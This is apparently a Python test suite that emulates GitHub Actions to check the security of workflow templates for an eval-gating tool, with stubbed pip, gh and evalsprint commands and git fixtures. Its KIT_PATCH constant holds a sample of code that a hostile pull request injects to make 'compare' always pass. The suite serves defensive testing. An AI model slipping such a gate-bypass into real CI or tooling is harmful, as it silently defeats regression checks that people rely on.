# ------------------------------------------------------------------ GitHub Actions emulator

_TOKEN = re.compile(
    r"""\s*(?:(?P<str>'(?:[^']|'')*')|(?P<op>&&|\|\||==|!=|!|\(|\))|(?P<name>[A-Za-z_][\w-]*(?:\.[\w-]+)*(?:\(\))?))""", re.X
)
_INTERP = re.compile(r"\$\{\{(.*?)\}\}", re.S)


class OutputFileError(ValueError):
    """A line of $GITHUB_OUTPUT that GitHub's runner refuses; the step fails. `partial` holds what was parsed before it."""

    def __init__(self, message: str, partial: dict[str, str]):
        super().__init__(message)
        self.partial = partial


def parse_output_file(text: str) -> dict[str, str]:
    """The grammar of a workflow command file ($GITHUB_OUTPUT), as the runner reads it (actions/runner, EnvFileKeyValuePairs).

    A line is `key=value`, or `key<<DELIMITER`, which starts a value made of the following lines up to the first line that equals
    the delimiter exactly. The `=` wins when it comes before the `<<`. A key written twice keeps its LAST value. An empty line is
    skipped; any other line, an empty key or delimiter, or a heredoc whose delimiter never comes, is an error.
    This is what makes an injection testable: a value that contains a newline is not one output, it is several lines of the file.
    """
    out: dict[str, str] = {}
    lines = [line[:-1] if line.endswith("\r") else line for line in text.split("\n")]
    if lines and lines[-1] == "":
        lines.pop()
    i = 0
    while i < len(lines):
        line = lines[i]
        i += 1
        if not line:
            continue
        eq, hd = line.find("="), line.find("<<")
        if eq >= 0 and (hd < 0 or eq < hd):
            key, _, value = line.partition("=")
            if not key:
                raise OutputFileError(f"Invalid format '{line}'. Name must not be empty", out)
            out[key] = value
        elif hd >= 0:
            key, delimiter = line[:hd], line[hd + 2 :]
            if not key or not delimiter:
                raise OutputFileError(f"Invalid format '{line}'. Name and delimiter must not be empty", out)
            value = []
            while i < len(lines) and lines[i] != delimiter:
                value.append(lines[i])
                i += 1
            if i >= len(lines):
                raise OutputFileError(f"Matching delimiter not found '{delimiter}'", out)
            i += 1
            out[key] = "\n".join(value)
        else:
            raise OutputFileError(f"Invalid format '{line}'", out)
    return out


def upload_root(paths: list[Path]) -> Path:
    """Where the tree of an uploaded artifact starts (actions/upload-artifact v4+): the folder itself for one folder, the parent
    of one file, and for several paths their least common ancestor. Everything is stored relative to it."""
    if len(paths) == 1:
        return paths[0] if paths[0].is_dir() else paths[0].parent
    common: list[str] = []
    for chunk in zip(*(p.parts for p in paths)):
        if len(set(chunk)) != 1:
            break
        common.append(chunk[0])
    return Path(*common)


class Runner:
    """Runs the jobs of one workflow file the way a GitHub-hosted runner would, closely enough for these templates.

    Supported: workflow/job/step `env`, `if` with && || ! == != and always()/cancelled()/success()/failure(),
    `needs` (result and outputs), step and job outputs via $GITHUB_OUTPUT, `continue-on-error`, `$GITHUB_STEP_SUMMARY`,
    `actions/checkout` (a `ref:` really checks that commit out of the origin; without one the workspace prepared by the
    test is used), `actions/setup-python` (no-op), `actions/upload-artifact` and `actions/download-artifact` (a local
    artifact store). `run:` uses `bash -e`.

    Every job is its own machine: it gets its OWN workspace, RUNNER_TEMP and HOME, and nothing reaches the next job
    except job outputs and artifacts. That is what makes "the compare job runs without the PR's code" testable.
    """

    def __init__(self, workflow: dict, root: Path, github: dict, secrets: dict, stubs: dict[str, str], workspaces: dict[str, Path], checkout_ref=None):
        self.wf, self.root = workflow, root
        self.github, self.secrets = github, secrets
        self.workspaces = workspaces  # job id -> workspace, or a callable that makes it (jobs without one get an empty directory)
        self.checkout_ref = checkout_ref  # callable(workspace, ref): what `actions/checkout` with `ref:` leaves behind
        self.artifacts = root / "artifacts"
        self.artifacts.mkdir(parents=True, exist_ok=True)
        self.bin = root / "bin"
        self.bin.mkdir(exist_ok=True)
        for name, source in stubs.items():
            path = self.bin / name
            path.write_text(f"#!{sys.executable}\n{textwrap.dedent(source)}", encoding="utf-8")
            path.chmod(path.stat().st_mode | stat.S_IEXEC)
        self.jobs: dict[str, dict] = {}
        self.stub_env: dict[str, str] = {}
        self.start_at: dict[str, str] = {}  # job id -> id or name of the first step to execute (earlier ones are skipped)
        self.seed_steps: dict[str, dict[str, dict]] = {}  # job id -> {step id: {"outputs": {...}}} for the skipped steps
        self.temp_files: dict[str, dict[str, str]] = {}  # job id -> {path relative to that job's RUNNER_TEMP: text}
        self.workspace_paths: dict[str, Path] = {}  # job id -> the workspace the job really used
        self.uploads: dict[str, dict] = {}  # artifact name -> {"retention_days", "files" (relative to the artifact root), "job"} of the last upload
        self.job_now = ""

    def temp_of(self, job_id: str) -> Path:
        return self.root / f"temp_{job_id}"

    def home_of(self, job_id: str) -> Path:
        return self.root / f"home_{job_id}"

    # ---- expressions
    def lookup(self, ctx: dict, path: str):
        node = ctx
        for part in path.split("."):
            if not isinstance(node, dict) or part not in node:
                return ""
            node = node[part]
        return "" if node is None else node

    def evaluate(self, expr: str, ctx: dict, cancelled: bool = False, failed: bool = False):
        code, pos = [], 0
        expr = expr.strip()
        while pos < len(expr):
            match = _TOKEN.match(expr, pos)
            if not match:
                raise ValueError(f"cannot parse expression {expr!r} at {expr[pos:]!r}")
            pos = match.end()
            if match["str"]:
                code.append(repr(match["str"][1:-1].replace("''", "'")))
            elif match["op"]:
                code.append({"&&": " and ", "||": " or ", "!": " not "}.get(match["op"], f" {match['op']} "))
            else:
                name = match["name"]
                if name.endswith("()"):
                    code.append(f"fn_{name[:-2]}()")
                elif name in ("true", "false", "null"):
                    code.append({"true": "True", "false": "False", "null": "''"}[name])
                else:
                    code.append(f"lookup({name!r})")
        scope = {
            "lookup": lambda path: self.lookup(ctx, path),
            "fn_always": lambda: True,
            "fn_cancelled": lambda: cancelled,
            "fn_success": lambda: not failed and not cancelled,
            "fn_failure": lambda: failed,
        }
        return eval("".join(code), {"__builtins__": {}}, scope)  # noqa: S307 - own workflow files, whitelisted scope

    def interpolate(self, text, ctx: dict) -> str:
        if not isinstance(text, str):
            return "" if text is None else str(text).lower() if isinstance(text, bool) else str(text)

        def show(match):
            value = self.evaluate(match.group(1), ctx)
            return "true" if value is True else "false" if value is False else "" if value is None else str(value)

        return _INTERP.sub(show, text)

    def condition(self, cond, ctx: dict, failed: bool) -> bool:
        """An `if:` the way GitHub reads it: without a status function in it, `success()` is applied implicitly."""
        if cond is None:
            return not failed
        text = str(cond).strip()
        if text.startswith("${{") and text.endswith("}}"):
            text = text[3:-2]
        if failed and not re.search(r"\b(?:always|cancelled|success|failure)\(\)", text):
            return False
        return bool(self.evaluate(text, ctx, failed=failed))

    # ---- execution
    def run(self, only: tuple[str, ...] | None = None, seed: dict[str, dict] | None = None) -> "Runner":
        """Run every job (or just `only`); `seed` supplies the result and outputs of jobs that are not run."""
        for job_id, record in (seed or {}).items():
            self.jobs[job_id] = {"result": "success", "outputs": {}, "steps": {}, "summary": "", "log": "", **record}
        pending = [j for j in self.wf["jobs"] if j not in self.jobs and (only is None or j in only)]
        while pending:
            for job_id in list(pending):
                needs = self.wf["jobs"][job_id].get("needs") or []
                needs = [needs] if isinstance(needs, str) else needs
                if all(n in self.jobs for n in needs):
                    self.run_job(job_id, needs)
                    pending.remove(job_id)
                    break
            else:
                raise RuntimeError("circular needs, or a needed job that was neither run nor seeded: " + ", ".join(pending))
        return self

    def base_env(self, job_id: str, workspace: Path, job_summary: Path, output: Path) -> dict:
        env = {k: v for k, v in os.environ.items() if not k.endswith("_API_KEY") and not k.startswith(("GITHUB_", "GIT_", "STUB_"))}
        env.update(
            PATH=f"{self.bin}{os.pathsep}{os.environ['PATH']}",
            HOME=str(self.home_of(job_id)),
            GIT_CONFIG_NOSYSTEM="1",
            GIT_TERMINAL_PROMPT="0",
            GIT_AUTHOR_NAME="test",
            GIT_AUTHOR_EMAIL="test@example.com",
            GIT_COMMITTER_NAME="test",
            GIT_COMMITTER_EMAIL="test@example.com",
            GITHUB_OUTPUT=str(output),
            GITHUB_STEP_SUMMARY=str(job_summary),
            GITHUB_WORKSPACE=str(workspace),
            GITHUB_REF_NAME=self.github.get("ref_name", "main"),
            GITHUB_SHA=self.github.get("sha", "0" * 40),
            RUNNER_TEMP=str(self.temp_of(job_id)),
            PYTHONUTF8="1",
            STUB_JOB=job_id,
            **self.stub_env,
        )
        return env

    def run_job(self, job_id: str, needs: list[str]) -> None:
        job = self.wf["jobs"][job_id]
        temp = self.temp_of(job_id)
        ctx = {
            "github": self.github,
            "secrets": self.secrets,
            "needs": {n: {"result": self.jobs[n]["result"], "outputs": self.jobs[n]["outputs"]} for n in needs},
            "steps": {},
            "runner": {"temp": str(temp)},
            "env": {},
        }
        record = {"result": "skipped", "outputs": {}, "steps": {}, "summary": "", "log": ""}
        self.jobs[job_id] = record
        self.job_now = job_id
        needs_passed = all(self.jobs[n]["result"] == "success" for n in needs)  # a skipped or failed job skips its dependents...
        if "if" in job:
            run_it = self.condition(job["if"], ctx, failed=not needs_passed)  # ...unless their `if:` has a status function
        else:
            run_it = needs_passed
        if not run_it:
            return

        temp.mkdir(parents=True, exist_ok=True)
        self.home_of(job_id).mkdir(parents=True, exist_ok=True)
        for rel, text in (self.temp_files.get(job_id) or {}).items():
            write(temp / rel, text)
        workspace = self.workspaces.get(job_id)
        workspace = workspace() if callable(workspace) else workspace  # created only when the job really runs
        if workspace is None:
            workspace = self.root / f"ws_{job_id}"
            workspace.mkdir(exist_ok=True)
        self.workspace_paths[job_id] = workspace
        summary, output = self.root / f"summary_{job_id}.md", self.root / f"output_{job_id}.txt"
        summary.write_text("")
        env_base = self.base_env(job_id, workspace, summary, output)
        scoped_env = {}
        for source in (self.wf.get("env") or {}, job.get("env") or {}):
            scoped_env.update({k: self.interpolate(v, ctx) for k, v in source.items()})
        ctx["env"] = dict(scoped_env)  # what `env.X` reads in a step's `if:`

        failed = False
        ctx["steps"].update(self.seed_steps.get(job_id, {}))
        started = job_id not in self.start_at
        for index, step in enumerate(job["steps"]):
            key = step.get("id") or step.get("name") or f"step{index}"
            started = started or self.start_at[job_id] in (step.get("id"), step.get("name"))
            if not started:
                continue
            if not self.condition(step.get("if"), ctx, failed):
                record["steps"][key] = {"outcome": "skipped", "stdout": ""}
                if step.get("id"):
                    ctx["steps"][step["id"]] = {"outputs": {}, "outcome": "skipped", "conclusion": "skipped"}
                continue
            output.write_text("")
            step_env = {k: self.interpolate(v, ctx) for k, v in (step.get("env") or {}).items()}
            ok, stdout = self.run_step(job_id, step, ctx, workspace, {**env_base, **scoped_env, **step_env})
            try:
                outputs = self.read_outputs(output)
            except OutputFileError as exc:  # the runner fails the step; what was read before the bad line stays set
                outputs, ok = exc.partial, False
                stdout += f"\nError: Unable to process file command 'output' successfully.\nError: {exc}\n"
            step_record = {"outcome": "success" if ok else "failure", "stdout": stdout, "outputs": outputs}
            record["steps"][key] = step_record
            if step.get("id"):
                ctx["steps"][step["id"]] = {"outputs": outputs, "outcome": step_record["outcome"], "conclusion": step_record["outcome"]}
            record["log"] += stdout
            if not ok and not step.get("continue-on-error"):
                failed = True
        record["result"] = "failure" if failed else "success"
        record["summary"] = summary.read_text(encoding="utf-8")
        record["outputs"] = {k: self.interpolate(v, ctx) for k, v in (job.get("outputs") or {}).items()}

    @staticmethod
    def read_outputs(path: Path) -> dict:
        return parse_output_file(path.read_text(encoding="utf-8"))

    def run_step(self, job_id: str, step: dict, ctx: dict, workspace: Path, env: dict) -> tuple[bool, str]:
        if "uses" in step:
            return self.run_action(step["uses"], {k: self.interpolate(v, ctx) for k, v in (step.get("with") or {}).items()}, workspace)
        script = self.root / "step.sh"
        script.write_text(step["run"], encoding="utf-8")
        try:
            proc = subprocess.run(["bash", "-e", str(script)], cwd=workspace, env=env, capture_output=True, text=True, timeout=120)
        except OSError as exc:  # E2BIG: an environment value above the kernel's limit; the runner fails the step the same way
            return False, f"Error: cannot start the step: {exc}\n"
        return proc.returncode == 0, proc.stdout + proc.stderr

    @staticmethod
    def resolve(workspace: Path, name: str) -> Path:
        path = Path(name)
        return path if path.is_absolute() else workspace / path

    def run_action(self, uses: str, params: dict, workspace: Path) -> tuple[bool, str]:
        action = uses.split("@")[0]
        if action == "actions/checkout":
            if params.get("ref"):
                if self.checkout_ref is None:
                    return False, "no origin to check out from"
                try:
                    self.checkout_ref(workspace, params["ref"])
                except subprocess.CalledProcessError as exc:
                    return False, f"checkout of {params['ref']!r} failed: {exc.stderr}"
            return True, ""
        if action == "actions/setup-python":
            return True, ""
        if action == "actions/upload-artifact":
            patterns = [p.strip() for p in params["path"].splitlines() if p.strip()]
            for pattern in patterns:
                if any(ch in pattern for ch in "*?["):
                    raise NotImplementedError(f"wildcards in an artifact path are not emulated: {pattern}")
            paths = [self.resolve(workspace, p) for p in patterns]
            dest = self.artifacts / params["name"]
            found = [p for p in paths if p.exists()]
            if not found:
                return params.get("if-no-files-found", "warn") != "error", "no files found"
            root = upload_root(paths)  # the root comes from every path asked for, found or not
            shutil.rmtree(dest, ignore_errors=True)
            dest.mkdir(parents=True)
            for source in found:
                if source == root:
                    shutil.copytree(source, dest, dirs_exist_ok=True)
                    continue
                target = dest / source.relative_to(root)
                target.parent.mkdir(parents=True, exist_ok=True)
                shutil.copytree(source, target, dirs_exist_ok=True) if source.is_dir() else shutil.copy2(source, target)
            self.uploads[params["name"]] = {
                "retention_days": params.get("retention-days", ""),
                "files": sorted(str(f.relative_to(dest)) for f in dest.rglob("*") if f.is_file()),
                "job": self.job_now,
                "paths": patterns,
            }
            return True, ""
        if action == "actions/download-artifact":
            source = self.artifacts / params["name"]
            if not source.is_dir():
                return False, f"Artifact not found: {params['name']}"
            target = self.resolve(workspace, params.get("path", "."))
            target.mkdir(parents=True, exist_ok=True)
            shutil.copytree(source, target, dirs_exist_ok=True, symlinks=True)  # links stay links: the worst case for the job that reads them
            return True, ""
        raise NotImplementedError(uses)

    # ---- results
    def annotations(self, job_id: str, level: str) -> list[str]:
        return [line for line in self.jobs[job_id]["log"].splitlines() if line.startswith(f"::{level} ")]


# ---------------------------------------------------------------------------------- stubs

STUB_EVALSPRINT = r"""
import json, os, pathlib, shutil, sys

args = sys.argv[1:]
log = pathlib.Path(os.environ["STUB_LOG"])
job = os.environ.get("STUB_JOB")
with log.open("a", encoding="utf-8") as fh:
    fh.write(json.dumps({"tool": "evalsprint", "args": args, "cwd": os.getcwd(), "job": job}) + "\n")


def opt(name, default=None):
    return args[args.index(name) + 1] if name in args else default


command = args[0] if args else ""
if command == "run":
    out = pathlib.Path(opt("--out", "runs/x"))
    out.mkdir(parents=True, exist_ok=True)
    (out / "summary.json").write_text(os.environ.get("STUB_SUMMARY", "{}"), encoding="utf-8")
    (out / "results.jsonl").write_text(os.environ.get("STUB_RESULTS", ""), encoding="utf-8")
    for extra in json.loads(os.environ.get("STUB_EXTRA_FILES", "[]")):  # what a real run (or the PR's code) may leave beside the results
        (out / extra).write_text("left behind by the run\n", encoding="utf-8")
    sys.exit(int(os.environ.get("STUB_RUN_EXIT", "0")))
if command == "compare":
    baseline, candidate = args[1], args[2]
    gate_file = opt("--gate-config") or opt("-c")
    gate = pathlib.Path(gate_file).read_text(encoding="utf-8") if gate_file else ""
    base_summary = json.loads((pathlib.Path(baseline) / "summary.json").read_text(encoding="utf-8"))
    cand_summary = pathlib.Path(candidate) / "summary.json"
    with log.open("a", encoding="utf-8") as fh:
        fh.write(json.dumps({"tool": "compare-inputs", "job": job, "cwd": os.getcwd(), "gate_file": gate_file, "gate": gate, "baseline": baseline, "candidate": candidate,
                             "candidate_summary": cand_summary.read_text(encoding="utf-8") if cand_summary.exists() else None,
                             "baseline_run": base_summary.get("run_id"), "calibration": (pathlib.Path(baseline) / "calibration.json").exists()}) + "\n")
    # The stub "judges" like a strict gate: a loosened gate (max_pass_rate_drop >= 0.5) would let the candidate through.
    loosened = "max_pass_rate_drop: 1" in gate or "max_pass_rate_drop: 0.9" in gate
    default_code = 0 if loosened else 1
    code = int(os.environ.get("STUB_COMPARE_EXIT", str(default_code)))
    md = opt("--md")
    if md and os.environ.get("STUB_COMPARE_WRITES_MD", "1") == "1":
        headline = "No regression" if code == 0 else "Regression detected"
        pathlib.Path(md).write_text(f"## {headline}\n\nSTUB compare: gate={gate.strip()!r} baseline_run={base_summary.get('run_id')}\n" + os.environ.get("STUB_MD_EXTRA", ""), encoding="utf-8")
    js = opt("--json")
    if js:
        pathlib.Path(js).write_text(json.dumps({"verdict": "pass" if code == 0 else "regression", "reasons": []}), encoding="utf-8")
    sys.exit(code)
if command == "report":
    out, code = opt("-o"), int(os.environ.get("STUB_REPORT_EXIT", "0"))
    if out and code == 0:
        pathlib.Path(out).write_text("<html>stub report</html>", encoding="utf-8")
    sys.exit(code)
if command == "baseline":
    run_dir, dest = pathlib.Path(args[1]), pathlib.Path(opt("--to"))
    if os.environ.get("STUB_BASELINE_EXIT"):
        sys.exit(int(os.environ["STUB_BASELINE_EXIT"]))
    dest.mkdir(parents=True, exist_ok=True)
    for name in ("results.jsonl", "summary.json", "calibration.json"):
        if (run_dir / name).exists():
            shutil.copy2(run_dir / name, dest / name)
    sys.exit(0)
sys.exit(2)
"""

STUB_PIP = r"""
import json, os, pathlib, subprocess, sys

args = sys.argv[1:]
config = subprocess.run(["git", "config", "--global", "--get-regexp", "insteadof"], capture_output=True, text=True).stdout
requirements = ""
if "-r" in args and pathlib.Path(args[args.index("-r") + 1]).exists():
    requirements = pathlib.Path(args[args.index("-r") + 1]).read_text(encoding="utf-8")
with open(os.environ["STUB_LOG"], "a", encoding="utf-8") as fh:
    fh.write(json.dumps({"tool": "pip", "args": args, "job": os.environ.get("STUB_JOB"), "cwd": os.getcwd(), "requirements": requirements, "git_rewrite_during_install": config.strip()}) + "\n")
fail_job = os.environ.get("STUB_PIP_FAIL_JOB")  # make the install fail in one job only
code = int(os.environ.get("STUB_PIP_EXIT", "0"))
sys.exit(code if not fail_job or fail_job == os.environ.get("STUB_JOB") else 0)
"""

# A pip that really installs the kit: a private copy of the `evalsprint` package under this job's HOME (a job is a machine of its
# own, so is its Python environment). What the requirements file names decides what is installed: the marker `evil-kit` stands for a
# kit that a pull request swapped in and that makes `compare` exit 0 whatever it found.
REAL_PIP = r"""
import json, os, pathlib, shutil, subprocess, sys

ROOT = pathlib.Path(__VAR_ROOT__)
KIT_PATCH = __VAR_PATCH__

args = sys.argv[1:]
config = subprocess.run(["git", "config", "--global", "--get-regexp", "insteadof"], capture_output=True, text=True).stdout
requirements = pathlib.Path(args[args.index("-r") + 1]).read_text(encoding="utf-8") if "-r" in args else ""
with open(os.environ["STUB_LOG"], "a", encoding="utf-8") as fh:
    fh.write(json.dumps({"tool": "pip", "args": args, "job": os.environ.get("STUB_JOB"), "cwd": os.getcwd(), "requirements": requirements, "git_rewrite_during_install": config.strip()}) + "\n")
if os.environ.get("STUB_PIP_EXIT", "0") != "0":
    sys.exit(int(os.environ["STUB_PIP_EXIT"]))
site = pathlib.Path(os.environ["HOME"]) / "site"
dest = site / "evalsprint"
shutil.rmtree(dest, ignore_errors=True)
shutil.copytree(ROOT / "evalsprint", dest, ignore=shutil.ignore_patterns("__pycache__", "templates"))
if "evil-kit" in requirements:
    cli = dest / "cli.py"
    cli.write_text(cli.read_text(encoding="utf-8") + KIT_PATCH, encoding="utf-8")
"""

# The injected code: `compare` exits 0 whatever it found. Appended to cli.py of an installed kit.
KIT_PATCH = """

# --- injected by the pull request ---
_real_cmd_compare = cmd_compare


def cmd_compare(args):
    _real_cmd_compare(args)
    return 0
"""

# The real command, from the kit installed in THIS job. Without a pip install in the job there is no `evalsprint`.
REAL_EVALSPRINT = """
import os, sys

site = os.path.join(os.environ["HOME"], "site")
if not os.path.isdir(os.path.join(site, "evalsprint")):
    sys.stderr.write("evalsprint: command not found: nothing installed the kit in this job\\n")
    sys.exit(127)
sys.path.insert(0, site)
from evalsprint.cli import main

sys.exit(main(sys.argv[1:]))
"""

STUB_GH = r"""
import json, os, pathlib, sys

args = sys.argv[1:]
log = pathlib.Path(os.environ["STUB_LOG"])
state_path = pathlib.Path(os.environ.get("STUB_GH_STATE", "gh_state.json"))
with log.open("a", encoding="utf-8") as fh:
    fh.write(json.dumps({"tool": "gh", "args": args, "job": os.environ.get("STUB_JOB")}) + "\n")
if os.environ.get("STUB_GH_FAIL"):
    print("HTTP 403: Resource not accessible by integration", file=sys.stderr)
    sys.exit(1)
if not os.environ.get("GH_TOKEN"):
    print("gh: no token", file=sys.stderr)
    sys.exit(4)
state = json.loads(state_path.read_text(encoding="utf-8")) if state_path.exists() else {"comments": [], "next_id": 1000, "prs": []}


def save():
    state_path.write_text(json.dumps(state), encoding="utf-8")


def body_arg():
    spec = args[args.index("-F") + 1]
    key, _, value = spec.partition("=")
    assert key == "body" and value.startswith("@"), spec
    return pathlib.Path(value[1:]).read_text(encoding="utf-8")


if args[:1] == ["pr"] and args[1:2] == ["create"]:
    body = pathlib.Path(args[args.index("--body-file") + 1]).read_text(encoding="utf-8")
    state["prs"].append({"title": args[args.index("--title") + 1], "head": args[args.index("--head") + 1], "base": args[args.index("--base") + 1], "body": body})
    save()
    sys.exit(0)
assert args[0] == "api", args
method = args[args.index("--method") + 1] if "--method" in args else "GET"
path = next(a for a in args[1:] if a.startswith("repos/"))
if method == "GET":
    comments = state["comments"]
    pages = [comments[i : i + 2] for i in range(0, len(comments), 2)] or [[]]
    sys.stdout.write("".join(json.dumps(page) for page in pages))  # gh --paginate prints one JSON array per page
elif method == "PATCH":
    comment_id = int(path.rsplit("/", 1)[1])
    comment = next(c for c in state["comments"] if c["id"] == comment_id)
    assert comment["user"]["login"] == os.environ.get("STUB_GH_ME", "github-actions[bot]"), "cannot edit somebody else's comment"
    comment["body"] = body_arg()
    save()
elif method == "POST":
    state["comments"].append({"id": state["next_id"], "user": {"login": os.environ.get("STUB_GH_ME", "github-actions[bot]")}, "body": body_arg()})
    state["next_id"] += 1
    save()
"""


# ------------------------------------------------------------------------------ scenarios


def git(cwd: Path, *args: str) -> str:
    env = dict(
        os.environ,
        GIT_AUTHOR_NAME="test",
        GIT_AUTHOR_EMAIL="test@example.com",
        GIT_COMMITTER_NAME="test",
        GIT_COMMITTER_EMAIL="test@example.com",
        GIT_CONFIG_NOSYSTEM="1",
    )
    return subprocess.run(["git", *args], cwd=cwd, env=env, check=True, capture_output=True, text=True).stdout.strip()


STRICT_GATE = "suite: demo\ndataset: cases.jsonl\ngate:\n  max_pass_rate_drop: 0.02\n  critical_tags: [safety]\n"
LOOSE_GATE = "suite: demo\ndataset: cases.jsonl\ngate:\n  max_pass_rate_drop: 1.0\n  max_error_rate: 1.0\n"
BASE_SUMMARY = {"run_id": "20260101-000000-base", "n_cases": 4, "pass_rate": 0.75, "n_errors": 0}
RELEVANT = {"changes": {"outputs": {"relevant": "true"}}}  # a seeded `changes` job that found LLM code in the diff
KEYS = {"check-secrets": {"outputs": {"available": "true", "reason": ""}}}  # a seeded `check-secrets` job that found an API key
TRUSTED_OK = {"trusted": {"outputs": {"available": "true", "missing": "false", "missing_why": "", "base_sha": "0123456789abcdef"}}}  # the base branch has a baseline
# What calibrate() writes: the decision is taken on the weighted pair; the unweighted one describes the label sample and differs on purpose.
CALIBRATION = {
    "judge": "quality", "kappa": 0.55, "kappa_ci": [0.3, 0.75], "kappa_weighted": 0.81, "kappa_weighted_ci": [0.7, 0.9],
    "kappa_decision": "usable", "n": 60, "run_id": "20251201-000000-old",
}  # fmt: skip
LEGACY_CALIBRATION = {"judge": "quality", "kappa": 0.81, "kappa_ci": [0.7, 0.9], "kappa_decision": "usable", "n": 60, "run_id": "20251201-000000-old"}


def write(path: Path, text: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")


def make_origin(
    root: Path,
    with_baseline: bool = True,
    calibrated: bool | dict = True,  # True: the calibration.json calibrate() writes; a dict: that content instead
    gate: str = STRICT_GATE,
    summary: dict | None = None,
    results: str = "",
    then=None,
) -> Path:
    """A bare repository whose `main` holds an eval setup (or not, for the bootstrap case).

    `then(seed)` edits the working tree after the first commit and is committed on top of it as a second commit:
    that is how a base branch that once had a baseline and lost it (a merged pull request deleted it) is built.
    """
    root.mkdir(parents=True, exist_ok=True)
    seed = root / "seed"
    seed.mkdir()
    git(seed, "init", "-q", "-b", "main")
    write(seed / "src" / "llm" / "prompt.txt", "v1\n")
    write(seed / "evals" / "cases.jsonl", '{"id": "a"}\n{"id": "b"}\n{"id": "c"}\n{"id": "d"}\n')
    write(seed / "evals" / "requirements.txt", "evalsprint @ git+https://github.com/example/eval-sprint@v0.2.0\n")
    if with_baseline:
        write(seed / "evals" / "eval.yaml", gate)
        write(seed / "evals" / "baseline" / "summary.json", json.dumps(summary or BASE_SUMMARY))
        write(seed / "evals" / "baseline" / "results.jsonl", results)
        if calibrated:
            write(seed / "evals" / "baseline" / "calibration.json", json.dumps(CALIBRATION if calibrated is True else calibrated))
    git(seed, "add", "-A")
    git(seed, "commit", "-q", "-m", "base")
    if then is not None:
        then(seed)
        git(seed, "add", "-A")
        git(seed, "commit", "-q", "-m", "later")
    origin = root / "origin.git"
    git(root, "clone", "-q", "--bare", str(seed), str(origin))
    return origin


def delete_baseline(seed: Path) -> None:
    """What a merged pull request that removes the committed baseline leaves behind (evals/eval.yaml stays)."""
    git(seed, "rm", "-r", "-q", "evals/baseline")


def delete_summary_only(seed: Path) -> None:
    (seed / "evals" / "baseline" / "summary.json").unlink()


def restore_baseline(seed: Path) -> None:
    delete_baseline(seed)
    git(seed, "commit", "-q", "-m", "remove the baseline")
    write(seed / "evals" / "baseline" / "summary.json", json.dumps(BASE_SUMMARY))
    write(seed / "evals" / "baseline" / "results.jsonl", "")


def add_eval_yaml_only(seed: Path) -> None:
    """The first pull request of an installation: evals/eval.yaml is merged, the first baseline is not."""
    write(seed / "evals" / "eval.yaml", STRICT_GATE)


class PrWorkflowBase(unittest.TestCase):
    """Shared fixture: a temp directory with origin repositories; `scenario` drives the emulator."""

    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        cls._tmp = tempfile.TemporaryDirectory(prefix="evalsprint-tmpl-")
        cls.tmp = Path(cls._tmp.name)
        cls.origin = make_origin(cls.tmp / "origin_main")
        cls.counter = 0

    @classmethod
    def tearDownClass(cls):
        cls._tmp.cleanup()
        super().tearDownClass()

    def scenario(
        self,
        *,
        pr_edits: dict[str, str | None] | None = None,
        secrets: dict | None = None,
        fork: bool = False,
        stub_env: dict | None = None,
        patch=None,
        event: str = "pull_request",
        gh_state: dict | Path | None = None,
        workflow: str | Path = PR_WORKFLOW,
        origin: Path | None = None,
        only: tuple[str, ...] | None = None,
        seed: dict[str, dict] | None = None,
        artifacts: dict[str, str | tuple] | None = None,
        clone: bool = True,
        files: dict[str, str] | None = None,
        temp_files: dict[str, dict[str, str]] | None = None,
        start_at: dict[str, str] | None = None,
        seed_steps: dict[str, dict[str, dict]] | None = None,
        evalsprint: str | None = None,
        real_kit: bool = False,
        actor: str = "octocat",
        merge: bool = True,
        stubs: dict[str, str] | None = None,
    ) -> Runner:
        """Run the workflow once.

        Every scenario gets its OWN bare copy of the origin it is given, so nothing a workflow pushes (the baseline branch)
        can leak into another test, whatever the order or the clock. `pr_edits` is the change of the pull request: `None`
        means "it edits a prompt" (a file that is in EVAL_PATHS), a dict is written as given. A pull request is checked out
        the way GitHub does it: as a merge commit of the PR head into the base branch (`merge=False` leaves the PR head
        checked out instead, which has one parent). A `None` value in `pr_edits` deletes that file. `real_kit=True` runs the
        real evalsprint from a copy that each job installs for itself (see REAL_PIP); otherwise `evalsprint` and `pip` are stubs.
        `temp_files` seeds files into the RUNNER_TEMP of a job; `files` goes into the workspace of the jobs that check the PR out.
        """
        type(self).counter += 1
        root = self.tmp / f"run{type(self).counter}"
        root.mkdir()
        made: dict[str, Path] = {}
        is_pr = event == "pull_request"
        edits = ({"src/llm/prompt.txt": "v2\n"} if pr_edits is None else pr_edits) if is_pr else (pr_edits or {})
        private = root / "origin.git"
        if clone:
            git(root, "clone", "-q", "--bare", f"file://{origin or self.origin}", str(private))

        def checkout(dirname: str):
            def workspace() -> Path:
                """What actions/checkout leaves on the runner: a clone on the pull request's merge commit (or a plain directory)."""
                path = root / dirname
                if not clone:
                    path.mkdir()
                    for rel, text in (files or {}).items():
                        write(path / rel, text)
                    made[dirname] = path
                    return path
                git(root, "clone", "-q", f"file://{private}", str(path))
                if edits:
                    git(path, "checkout", "-q", "-b", "pr-branch")
                    for rel, text in edits.items():
                        if text is None:
                            (path / rel).unlink()
                        else:
                            write(path / rel, text)
                    git(path, "add", "-A")
                    git(path, "commit", "-q", "-m", "the pull request")
                    if merge:
                        git(path, "checkout", "-q", "main")
                        git(path, "merge", "-q", "--no-ff", "-m", "Merge the pull request into main", "pr-branch")
                        git(path, "checkout", "-q", "--detach")
                made[dirname] = path
                return path

            return workspace

        def checkout_ref(workspace: Path, ref: str) -> None:
            """`actions/checkout` with `ref:`: that commit of the origin (a branch name or a sha), nothing of the pull request."""
            git(workspace, "clone", "-q", f"file://{private}", ".")
            git(workspace, "checkout", "-q", "--detach", ref)

        doc = load_workflow(workflow)
        if patch:
            patch(doc)
        github = {
            "actor": actor,
            "event_name": event,
            "base_ref": "main" if is_pr else "",
            "ref_name": "main",
            "sha": "a" * 40,
            "repository": "acme/app",
            "token": "ghs_test",
            "event": {
                "pull_request": {"number": 7, "head": {"repo": {"fork": "true" if fork else "false"}}} if is_pr else {},
                "repository": {"default_branch": "main"},
            },
        }
        secrets = {"ANTHROPIC_API_KEY": "sk-test"} if secrets is None else secrets
        state = root / "gh_state.json"
        if isinstance(gh_state, dict):
            state.write_text(json.dumps(gh_state), encoding="utf-8")
        elif gh_state is not None:
            state = gh_state
        kit_stubs = {"evalsprint": REAL_EVALSPRINT, "pip": REAL_PIP.replace("__VAR_ROOT__", repr(str(ROOT))).replace("__VAR_PATCH__", repr(KIT_PATCH))} if real_kit else {}
        runner = Runner(
            doc,
            root,
            github,
            secrets,
